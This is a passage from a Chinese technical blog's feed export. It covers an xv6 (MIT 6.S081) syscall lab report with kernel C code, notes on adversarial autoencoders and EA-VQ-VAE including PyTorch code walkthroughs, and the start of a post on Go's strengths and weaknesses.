p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;tracemask &amp; (<span class="number">1</span> &lt;&lt; num))</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d: syscall %s -&gt; %d\n"</span>, p-&gt;pid, sysname[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>不要忘记在 <code>fork</code> 调用中传播这个 mask。另外，用户态系统调用的声明和桩代码比较简单，这里就略去了。</p>
<h3 id="sysinfo">sysinfo</h3>
<p>要求实现一个系统调用，能够返回系统中的可用内存数量以及运行中的进程数量。难点有几处。</p>
<p>首先，如何计算可用内存大小？参考 <code>kernel/kalloc.c</code>，发现有一个名为 <code>kmem</code> 的变量保存了空闲物理页信息。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">} kmem;</span><br></pre></td></tr></tbody></table></figure>
<p>通过计算这个 <code>freelist</code> 链表的长度，乘以单个页面的大小，即可得到可用内存的大小，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_memory</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> amount = <span class="number">0</span>;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span> =</span> kmem.freelist;</span><br><span class="line">  <span class="keyword">for</span> (; r; r = r-&gt;next)</span><br><span class="line">  {</span><br><span class="line">    amount += PGSIZE;</span><br><span class="line">  }</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">return</span> amount;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>其次，如何计算运行中的进程数量。参考 <code>kernel/proc.c</code>，发现其声明了一个大小为 64 的 <code>proc</code> 数组，猜测其应该是支持的最大进程数量。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> <span class="title">proc</span>[<span class="title">NPROC</span>];</span> <span class="comment">// 64</span></span><br></pre></td></tr></tbody></table></figure>
<p><code>allocproc</code> 函数印证了这一点，该函数申请一个新的进程，是通过遍历上述数组，找到 <code>p-&gt;state
==
UNUSED</code> 实现的。因此可以通过遍历数组，统计得到运行中的进程数量，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// num of processes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_proc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (p = proc; p &lt; &amp;proc[NPROC]; p++)</span><br><span class="line">  {</span><br><span class="line">    acquire(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;state != UNUSED)</span><br><span class="line">    {</span><br><span class="line">      cnt++;</span><br><span class="line">    }</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> cnt;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>上面两个函数的声明需要加在 <code>kernel/defs.h</code> 中，方便调用。然后，可以在 <code>kernel/sysproc.c</code> 中新建系统调用。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">if</span> (argaddr(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  info.freemem = free_memory();</span><br><span class="line">  info.nproc = num_proc();</span><br><span class="line">  <span class="keyword">if</span> (copyout(myproc()-&gt;pagetable, addr, (<span class="keyword">char</span> *)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><code>copyout</code> 用于将内核的数据拷贝到用户态，参考 <code>fstat</code> 调用可以了解它的用法。</p>
<p>最后，完成用户态的相关代码即可。</p>
<h2 id="结果">结果</h2>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">== Test trace 32 grep == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace 32 grep: OK (4.8s) </span><br><span class="line">== Test trace all grep == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace all grep: OK (0.8s) </span><br><span class="line">== Test trace nothing == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace nothing: OK (0.8s) </span><br><span class="line">== Test trace children == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">trace children: OK (9.9s) </span><br><span class="line">== Test sysinfotest == </span><br><span class="line">$ make qemu-gdb</span><br><span class="line">sysinfotest: OK (1.7s) </span><br><span class="line">== Test time == </span><br><span class="line">time: OK </span><br><span class="line">Score: 35/35</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>操作系统</category>
        <category>MIT6.S081</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>实验报告</tag>
        <tag>操作系统</tag>
        <tag>MIT6.S081</tag>
      </tags>
  </entry>
  <entry>
    <title>对抗自编码器 AAE</title>
    <url>/blog/2021/10/05/aae/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>对抗自编码器（Adversarial
Autoencoders，AAE）出自 2015 年的《Adversarial
Autoencoders》，其核心想法是将 VAE 与 GAN 结合，来得到一个更好的生成模型。论文首次提出了聚合后验分布（aggregated
posterior），并使用它来优化 VAE。事实上这篇论文是在 CV 上生成的，这里只是简单分析下其提出的聚合后验分布及与 VAE 的比较。
<span id="more"></span></p>
<h2 id="对抗自编码器">对抗自编码器</h2>
<p>符号定义：</p>
<ul>
<li><span class="math inline">\(p(z)\)</span>：隐变量<span class="math inline"> \(z\)</span> 的先验分布</li>
<li><span class="math inline"> \(q(z|x)\)</span>：编码器分布</li>
<li><span class="math inline"> \(p(x|z)\)</span>：解码器分布</li>
<li><span class="math inline"> \(p_d(x)\)</span>：数据<span class="math inline"> \(x\)</span> 分布</li>
<li><span class="math inline"> \(p(x)\)</span>：模型的分布</li>
</ul>
<p>定义聚合分布<span class="math inline"> \(q(z)\)</span> 为<span class="math inline"> \(q(z)=\int_xq(z|x)p_d(x)dx\)</span>，AAE 添加了<span class="math inline"> \(q(z)\)</span> 与<span class="math inline"> \(p(z)\)</span> 进行匹配的正则化项，模型结构如下：</p>
<p><img src="architecture.png"></p>
<p>可以看到与 VAE 最大的区别是，VAE 是从后验分布<span class="math inline"> \(q(z|x)\)</span> 中采样、使用 KL 散度逼近后验分布与先验分布，AAE 是使用对抗网络来逼近<span class="math inline"> \(q(z)\)</span> 与<span class="math inline"> \(p(z)\)</span>。在此基础上，引入了一个对抗网络判断隐藏状态来自随机先验分布<span class="math inline"> \(p(z)\)</span> 的采样，还是来自<span class="math inline"> \(q(z)\)</span>。在编码器<span class="math inline"> \(q(z|x)\)</span> 的选择上，论文提供了三种候选：</p>
<ul>
<li>确定性函数，<span class="math inline">\(z\)</span> 仅与<span class="math inline"> \(x\)</span> 相关。</li>
<li>高斯分布，与分布参数和随机性相关。</li>
<li>通用近似后验，<span class="math inline">\(z\)</span> 与<span class="math inline"> \(x\)</span> 和随机噪声<span class="math inline"> \(\eta\)</span> 相关。通用近似是一种近似分布的方法，确定性函数<span class="math inline"> \(f(x,\eta)\)</span>，<span class="math inline">\(\eta\)</span> 是一个随机噪声，因而其可以看作分布的通用近似。</li>
</ul>
<p>论文中最终使用了确定性函数，个人猜测是更好收敛一些。</p>
<h2 id="section"></h2>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>生成模型</category>
      </categories>
      <tags>
        <tag>VAE</tag>
        <tag>GAN</tag>
      </tags>
  </entry>
  <entry>
    <title>EA-VQ-VAE 代码学习（1）</title>
    <url>/blog/2021/07/17/ea-vq-vae-code/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>之前学习 EA-VQ-VAE 的时候发现只读论文本身还是有很多细节问题不太懂，而 EA-VQ-VAE 的代码开源在 <a href="https://github.com/microsoft/EA-VQ-VAE">github</a> 上。今天正好通过学习代码更深层地理解一下这个模型以及基础的 VQ-VAE 模型。</p>
<span id="more"></span>
<h2 id="目录结构">目录结构</h2>
<p>代码的目录结构如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">│  README.md</span><br><span class="line">|  LICENSE</span><br><span class="line">├─data</span><br><span class="line">│      get_atomic_data.sh</span><br><span class="line">│      get_event2mind_data.sh</span><br><span class="line">│      preprocess-atomic.py</span><br><span class="line">│      preprocess-event2mind.py</span><br><span class="line">├─estimator</span><br><span class="line">│      model.py</span><br><span class="line">│      run.py</span><br><span class="line">├─generator</span><br><span class="line">│      beam.py</span><br><span class="line">│      model.py</span><br><span class="line">│      run.py</span><br><span class="line">└─vq-vae</span><br><span class="line">        gpt2.py</span><br><span class="line">        model.py</span><br><span class="line">        run.py</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，整个代码目录结构还是比较清晰的四部分：</p>
<ul>
<li>data/：用以数据的获取和预处理</li>
<li> estimator/：估计先验分布的模型</li>
<li> generator/：推理阶段生成推理文本（光束搜索等）</li>
<li>vq-vae/：vq-vae 的模型定义：包含 codebook、编码器、解码器等</li>
</ul>
<p>这次先介绍最为核心的 vq-vae 模型，处在 vq-vae/model.py。剩下的部分后续有时间再进行分享。</p>
<h2 id="vq-vae">VQ-VAE</h2>
<h3 id="model.py">model.py</h3>
<p>首先是 CodeBook。codebook 在 EA-VQ-VAE 充当了隐变量表的角色，保存了一张由 K 个 D 维隐变量组成的<span class="math inline"> \(R^{K*D}\)</span>。CodeBook 类代码如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CodeBook</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, num_embeddings, embedding_dim, commitment_cost</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(CodeBook, self).__init__()  </span><br><span class="line">        self._embedding_dim = embedding_dim</span><br><span class="line">        self._num_embeddings = num_embeddings     </span><br><span class="line">        self._embedding = nn.Embedding(self._num_embeddings, self._embedding_dim)      </span><br><span class="line">        self._commitment_cost = commitment_cost</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, inputs</span>):</span></span><br><span class="line">        <span class="comment"># Calculate distances</span></span><br><span class="line">        distances = (torch.<span class="built_in">sum</span>(inputs**<span class="number">2</span>, dim=<span class="number">1</span>, keepdim=<span class="literal">True</span>) </span><br><span class="line">                    + torch.<span class="built_in">sum</span>(self._embedding.weight**<span class="number">2</span>, dim=<span class="number">1</span>)</span><br><span class="line">                    - <span class="number">2</span> * torch.matmul(inputs, self._embedding.weight.t()))</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Encoding</span></span><br><span class="line">        encoding_indices = torch.argmin(distances, dim=<span class="number">1</span>).unsqueeze(<span class="number">1</span>)</span><br><span class="line">        encodings = torch.zeros(encoding_indices.shape[<span class="number">0</span>], self._num_embeddings).cuda()</span><br><span class="line">        encodings.scatter_(<span class="number">1</span>, encoding_indices, <span class="number">1</span>) <span class="comment"># 离散隐变量索引 [batch_size,num_embeddings]</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Quantize and unflatten</span></span><br><span class="line">        quantized = torch.matmul(encodings, self._embedding.weight) <span class="comment">## 乘法获得隐变量</span></span><br><span class="line">        <span class="comment"># 整个隐变量的获取方法有点复杂了，argmin之后直接查询embedding即可，无需手动操作。这里这样处理是为了后续</span></span><br><span class="line">        <span class="comment"># 还要计算perplexity</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Loss</span></span><br><span class="line">        <span class="comment"># detach()从计算图中脱离，达到stop gradient的目的</span></span><br><span class="line">        e_latent_loss = torch.mean((quantized.detach() - inputs)**<span class="number">2</span>) </span><br><span class="line">        q_latent_loss = torch.mean((quantized - inputs.detach())**<span class="number">2</span>)</span><br><span class="line">        loss = q_latent_loss + self._commitment_cost * e_latent_loss</span><br><span class="line">        </span><br><span class="line">        quantized = inputs + (quantized - inputs).detach()</span><br><span class="line">        avg_probs = torch.mean(encodings, dim=<span class="number">0</span>)</span><br><span class="line">        perplexity = torch.exp(-torch.<span class="built_in">sum</span>(avg_probs * torch.log(avg_probs + <span class="number">1e-10</span>)))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># convert quantized from BHWC -&gt; BCHW</span></span><br><span class="line">        <span class="keyword">return</span> loss, quantized, perplexity, encodings</span><br></pre></td></tr></tbody></table></figure>
<p>整个代码是比较清晰的。在初始化中根据传入参数初始化嵌入空间，并保存了 commitment
cost。commitment cost 指的是 VQ-VAE 损失函数的第三项的权重<span class="math inline"> \(\beta\)</span>。由论文可知，CodeBook 的前向过程应该是输入编码器输出<span class="math inline"> \(z_e(x)\)</span>，输出最近的隐变量<span class="math inline"> \(z\)</span>。那么代码中 inputs 的 shape 应该为 [batch_size，embedding_dim]，进而距离的计算过程就很自然了。其他见代码的注释部分。</p>
<p>接下来是 seq2seq 模型：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Build Seqence-to-Sequence.</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        * `encoder`- encoder of seq2seq model. e.g. 2-layer transformer</span></span><br><span class="line"><span class="string">        * `decoder`- decoder of seq2seq model. e.g. GPT2</span></span><br><span class="line"><span class="string">        * `config`- configuration of encoder model. </span></span><br><span class="line"><span class="string">        * `args`- arguments.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, encoder,decoder,config,args</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Model, self).__init__()</span><br><span class="line">        self.encoder = encoder</span><br><span class="line">        self.decoder=decoder</span><br><span class="line">        self.config=config</span><br><span class="line">        self.args=args</span><br><span class="line">        </span><br><span class="line">        self.lm_head = nn.Linear(config.hidden_size, config.vocab_size, bias=<span class="literal">False</span>)      </span><br><span class="line">        self.codebook = CodeBook(args.z_size, config.n_embd,<span class="number">0.25</span>)  </span><br><span class="line">        self.codebook._embedding.weight.data.normal_(mean=<span class="number">0</span>,std=<span class="number">0.1</span>)</span><br><span class="line">        self.lsm = nn.LogSoftmax(dim=-<span class="number">1</span>)</span><br><span class="line">        self.lm_head.weight=self.decoder.wte.weight     </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, event_ids,target_ids</span>):</span>   </span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">            Forward the VQ-VAE model.</span></span><br><span class="line"><span class="string">            Parameters:</span></span><br><span class="line"><span class="string">            * `event_ids`- event ids of examples</span></span><br><span class="line"><span class="string">            * `target_ids`- target ids of examples</span></span><br><span class="line"><span class="string">        """</span>  </span><br><span class="line">        input_ids=torch.cat((event_ids,target_ids),-<span class="number">1</span>)</span><br><span class="line">        <span class="comment">#obtain hidden of event+target by encoder</span></span><br><span class="line">        hidden_xy=self.encoder(input_ids,special=<span class="literal">True</span>)[<span class="number">0</span>][:,-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#obtain latent variable z by coodebook</span></span><br><span class="line">        vae_loss, z, perplexity, encoding=self.codebook(hidden_xy)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#obtain hiddens of target </span></span><br><span class="line">        transformer_outputs=self.decoder(input_ids,z=z)</span><br><span class="line">        hidden_states = transformer_outputs[<span class="number">0</span>][:,-target_ids.size(<span class="number">1</span>):]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#calculate loss</span></span><br><span class="line">        lm_logits = self.lm_head(hidden_states+z[:,<span class="literal">None</span>,:])</span><br><span class="line">        <span class="comment"># Shift so that tokens &lt; n predict n</span></span><br><span class="line">        active_loss = target_ids[..., <span class="number">1</span>:].ne(<span class="number">0</span>).view(-<span class="number">1</span>) == <span class="number">1</span> <span class="comment"># 将推理文本展平并得到非0位置的索引，用以计算loss</span></span><br><span class="line">        shift_logits = lm_logits[..., :-<span class="number">1</span>, :].contiguous() <span class="comment"># 去除末尾的EOS</span></span><br><span class="line">        shift_labels = target_ids[..., <span class="number">1</span>:].contiguous() <span class="comment"># </span></span><br><span class="line">        <span class="comment"># Flatten the tokens</span></span><br><span class="line">        loss_fct = CrossEntropyLoss(ignore_index=-<span class="number">1</span>)</span><br><span class="line">        loss = loss_fct(shift_logits.view(-<span class="number">1</span>, shift_logits.size(-<span class="number">1</span>))[active_loss],</span><br><span class="line">                        shift_labels.view(-<span class="number">1</span>)[active_loss])</span><br><span class="line"></span><br><span class="line">        outputs = (loss,vae_loss,perplexity),loss*active_loss.<span class="built_in">sum</span>(),active_loss.<span class="built_in">sum</span>(),encoding</span><br><span class="line">        <span class="keyword">return</span> outputs</span><br></pre></td></tr></tbody></table></figure>
<p>init 方法比较简单，只是保存参数和新建 codebook。前向过程也比较简单：训练阶段，seq2seq 的输入是事件和推理文本的拼接，然后进行编码和解码（这里编码器为 2 层 Transformer，解码器为预训练的 GPT 模型）。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>文本生成</category>
      </categories>
      <tags>
        <tag>VQ-VAE</tag>
      </tags>
  </entry>
  <entry>
    <title>推理文本生成 | EA-VQ-VAE</title>
    <url>/blog/2021/07/16/ea-vq-vae/</url>
    <content><![CDATA[<h2 id="题外话">题外话</h2>
<p>今天是我的生日，希望能看到这篇博客的你天天开心。如果今天还恰好是你的生日，希望你生日快乐！</p>
<h2 id="简介">简介</h2>
<p>EA-VQ-VAE 是微软团队于 2020 年发表的《Evidence-Aware Inferential Text
Generation with Vector Quantised Variational
AutoEncoder》中提出的模型，该文发表在 ACL 上。该文的主要工作是利用 VQ-VAE 进行推理文本生成。推理文本生成定义为，给定一个事件（例如 “A 偷看了 B 的日记”），从多个维度对该事件进行推断（“A 的心理状态”，“A 的目的”）。而 EA-VQ-VAE 中的 EA（Evidence-Aware）指的是利用证据来进行推理文本生成。</p>
<span id="more"></span>
<h2 id="实现方法">实现方法</h2>
<p>下图展示了整个模型的流程：给定事件<span class="math inline"> \(x\)</span> 后，经过 VQ-VAE 将其映射为离散的隐变量<span class="math inline"> \(z\)</span>，根据事件<span class="math inline"> \(x\)</span> 从文本语料中检索证据，再一起投喂给解码器输出最终的推理文本<span class="math inline"> \(y\)</span>。下面逐项介绍模型的细节。</p>
<p><img src="model.png"></p>
<h3 id="vq-vae">VQ-VAE</h3>
<p>VQ-VAE 的详细介绍可以看我的上一篇博客。论文使用的 VQ-VAE 与标准的 VQ-VAE 最主要的区别在于，普通的 VQ-VAE 生成是数据<span class="math inline"> \(x\)</span>，而在推理文本生成任务中，生成的是以符合事件<span class="math inline"> \(x\)</span> 的推理文本<span class="math inline"> \(y\)</span>，换而言之，这是一个<strong>条件模型</strong>，叫它 VQ-CVAE 可能更恰当一点。基于此，下面所述的后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span> 与先验分布<span class="math inline"> \(p_\theta(z|x)\)</span> 均与标准的 VQ-VAE 有所不同。</p>
<p>本文使用的 VQ-VAE 分为以下三个部分：</p>
<ul>
<li>codebook：对应 VQ-VAE 中的隐变量嵌入空间，只是换了个名字，同样是一张<span class="math inline"> \(R^{k*d}\)</span> 的表，由<span class="math inline"> \(k\)</span> 个维度为<span class="math inline"> \(d\)</span> 的隐变量组成</li>
<li>后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span>：同样是一个独热分布，使用最近邻算法将编码器输出<span class="math inline"> \(h_(x,y)\)</span> 映射到最近的隐变量<span class="math inline"> \(z'\)</span></li>
<li> 先验分布<span class="math inline"> \(p_\theta(z|x)\)</span>：先利用预训练的语言模型（例如 RoBERTa）将事件编码为隐藏状态<span class="math inline"> \(h\)</span>，，再将其映射为 k 个类别，即<span class="math inline"> \(p_\theta(z|x)=softmax(hW_k)\)</span></li>
</ul>
<h3 id="证据的检索与选择">证据的检索与选择</h3>
<p>去除事件中的停用词后，在大规模文本语料中使用 Elastic
Search 引擎检索事件，并选取前 K 个得分最高的句子。论文使用的语料库基于 BookCorpus，由一万多篇故事书组成，因为作者认为故事中会对事件的起因和结果介绍地较为清晰。</p>
<p>证据的选择与隐变量类似，在训练阶段和推理阶段有着不同的逻辑。在训练阶段，事件<span class="math inline"> \(x\)</span> 与推理文本<span class="math inline"> \(y\)</span> 均已知，例如给定事件 “A 读了 B 的日记”，与推理文本 “A 感到很愧疚”，那么证据 “A 偷了 B 的日记” 就比 “B 把日记给 A 看” 更合理，此时我们想要建模的就是<span class="math inline"> \(q(c|x,y)\)</span>（c 代表事件上下文，即证据）与<span class="math inline"> \(p(c|x)\)</span>。考虑到已经有一个后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span>，那么我们可以直接利用隐变量来完成证据的选择，即建模<span class="math inline"> \(p(c|z)\)</span>, 而不是再引入一个复杂的神经网络。对于一组证据（<span class="math inline">\(c_\phi\)</span> 代表填充的空证据）<span class="math inline">\(\{c_1,c_2,\dots,c_K,c_\phi\}\)</span>，使用 Transformer 将其编码为向量<span class="math inline"> \(\{h_{c_1},h_{c_2},\dots,h_{c_K},h_{c_\phi}\}\)</span>。<span class="math inline">\(p_s(c|z)\)</span> 与<span class="math inline"> \(q_\phi(z|x,y)\)</span> 类似，也是一个独热分布，再通过最近邻算法选取最近的证据，即：
<span class="math display">\[
p_s(c_k|z)=
\begin{cases}
1 &amp;if\ k=\arg\min_j||h_{c_j}-z||_2 \\
0 &amp;otherwise
\end{cases}
\]</span></p>
<p><span class="math display">\[
c_z=c_k\ where\ k=\arg\min_j||h_{c_j}-z||_2
\]</span></p>
<p>值得注意的是，作者没有使用注意力机制得到的 “软” 分布，而是借鉴 VQ-VAE，采用了一种独热分布将<span class="math inline"> \(z\)</span> 映射到最近的<span class="math inline"> \(c\)</span>。这样的优点是一定程度上降低了学习的难度，由于<span class="math inline"> \(z\)</span> 与<span class="math inline"> \(c\)</span> 处在同一个语义空间，解码器利用起来的效率会更高。而且这样做也更为统一。但我总觉得注意力机制得到的结果会更好一点，论文里没有进行比较属实有点伤。</p>
<h3 id="解码器">解码器</h3>
<p>解码器使用的是预训练的 GPT-2，是一个基于 Transformer 的语言模型。这里就不多赘述了，有兴趣的小伙伴可以去了解一下 GPT 家族。</p>
<h2 id="训练过程">训练过程</h2>
<p>首先单独训练 VQ-VAE 与 codebook，再训练基于后验分布<span class="math inline"> \(q_\phi(z|x,y)\)</span> 的证据感知解码器。</p>
<h3 id="vq-vae-1">VQ-VAE</h3>
<p>首先只根据隐变量<span class="math inline"> \(z\)</span> 重构推理文本<span class="math inline"> \(y\)</span>，损失函数与 VQ-VAE 损失函数类似： <span class="math display">\[
loss_{rec}=-logp(y|x,h_{(x,y)}+sg[z-h_{(x,y)}])+||sg[h_{(x,y)}]-z||_2^2+\beta||h_{(x,y)}-sg[z]||_2^2
\]</span></p>
<p>真实的先验分布可以使用频率近似（<span class="math inline">\(N_{(x)}\)</span> 代表包含<span class="math inline"> \(x\)</span> 事件的数据数量）： <span class="math display">\[
p(z|x)=\sum_{(x,y_i)\in D}\frac{q_\phi(z|x,y_i)}{N_{(x)}}
\]</span> 通过 KL 散度来优化先验分布<span class="math inline"> \(p_\theta(z|x)\)</span>: <span class="math display">\[
loss_{prior}=KL(p(z|x)||p_\theta(z|x))
\]</span></p>
<p>不过这里为什么不像 CVAE 一样，直接优化后验分布与先验分布间的 KL 散度，暂时还不是很理解。</p>
<h3 id="证据感知解码器">证据感知解码器</h3>
<p>这一部分通过最大化边际似然进行训练： <span class="math display">\[
\begin{align}
logp(y|x)&amp;=E_{z\sim q_\phi}[\sum_{c\in C}logp_m(y|x,c)p_s(c|z)]\\
&amp;=log(p_m(y|x,c_{z'}))+logp_s(c_{z'}|z')
\end{align}
\]</span>
然而，由于真实的证据是未知的，直接优化上述似然函数可能得不到正确结果。具体而言，与<span class="math inline"> \(z'\)</span> 最近的<span class="math inline"> \(c_{z'}\)</span> 不一定就是真实有用的证据，如果我们已知真实的证据标签<span class="math inline"> \(c\)</span>，损失函数中应该还有一项是<span class="math inline"> \(||c-c_{z'}||_2\)</span>。为解决这个问题，原论文采取了强化学习的方法：
<span class="math display">\[
R=\delta(p_m(y|x,c_{z'})-p_m(y|x,c_r))
\]</span></p>
<p><span class="math display">\[
\begin{align}
logp(y|x)&amp;=logp_m(y|x,c_{z'})+Rlogp_s(c_{z'}|z')\\
&amp;=logp_m(y|x,c_{z'})-R|||h_{c_{z'}}-z'||_2^2
\end{align}
\]</span> 其中，<span class="math inline">\(\delta(x)\)</span> 当 x 大于 0 时为 1，否则为 - 1。<span class="math inline">\(c_r\)</span> 为随机选取的与<span class="math inline"> \(c_{z'}\)</span> 不同的证据。这样设计的原因是，正确的证据相较于其他证据应该能够提高生成正确推理文本的概率。当<span class="math inline"> \(R\)</span> 为正时，<span class="math inline">\(logp(y|x)\)</span> 会更大，进而激励模型选择正确的证据。</p>
<h2 id="个案研究">个案研究</h2>
<p><img src="case.png"></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>文本生成</category>
      </categories>
      <tags>
        <tag>VQ-VAE</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈 Golang 的优缺点</title>
    <url>/blog/2023/03/05/golang-talk/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近学习完了《Go 程序设计语言》一书，感觉 Golang 作为一门现代语言，优缺点都非常的明显，也在网上看了很多吐槽或者赞扬 Golang 的说法，也是各有各的理。本文从个人的主观视角，聊一下我认为 Golang 设计及使用上的一些优缺点。</p>
<span id="more"></span>
<h2 id="优点">优点</h2>
<h3 id="容易入门">容易入门</h3>
<p>Go 最为人知的一个特点就是 “大道至简”，被誉为 21 世纪的 C 语言。Go 的一大特点是上手简单容易，虽然语法规则与 C、Java 等有较大差异（例如变量声明、无类型隐式转换等），但是还是能比较快地适应。</p>
<p>Go 设计的并不复杂，容器只有数组、切片、map；并发只有 goroutine、channel；锁只有互斥锁、读写锁；编程风格只有接口和接口实现，这大大地减少了入门的学习成本和系统的复杂性。当然这种特性也可以称之为 “简陋”，也是我认为 Go 的缺点之一，后面会再提到。</p>
<h3 id="默认初始化">默认初始化</h3>
<p>C 语言的一大特点就是随机初始化，未经显式初始化的局部变量的值均为随机数。在 Go 中，所有的类型都有对应的零值，例如 bool 类型默认是 false，int 默认是 0，指针默认是 nil，struct 会递归地为每个字段赋零值。这样虽然可能会多余一些初始化的开销，但是代码会更加健壮。</p>
<p>包括像 map 访问不存在的元素时，也会默认返回零值，而不是异常。</p>
<h3 id="多返回值">多返回值</h3>
<p>C 语言一个典型的问题是不支持多返回值，这意味着要么使用特殊值做异常处理（例如 - 1，null），要么就得新建一个结构体对结果再次包装。Java 提供了 Optional 这一包装类来解决这个问题，虽然解决了这个问题，但还是无法覆盖其他多返回值需要的场景。Python 支持多返回值作为一个 tuple 返回，C++ 可以通过 pair 来部分支持。</p>
<p>Go 支持多返回值并且提供了一种良好的编程风格，即一个函数总是应该返回两个参数，结果和对应的解释：</p>
<ul>
<li>如果函数只可能存在一种失败情况，解释应该是一个 bool，标识这次操作是否成功。例如 map 查找，失败的唯一原因就是 key 不存在。</li>
<li>如果函数存在多种失败情况，解释应该是一个 error，标识操作的错误类型。</li>
</ul>
<p>这使得 Go 能够比较灵活地处理函数执行过程中可能出现的各种错误，当然这也是有代价的。</p>
<h3 id="goroutine">goroutine</h3>
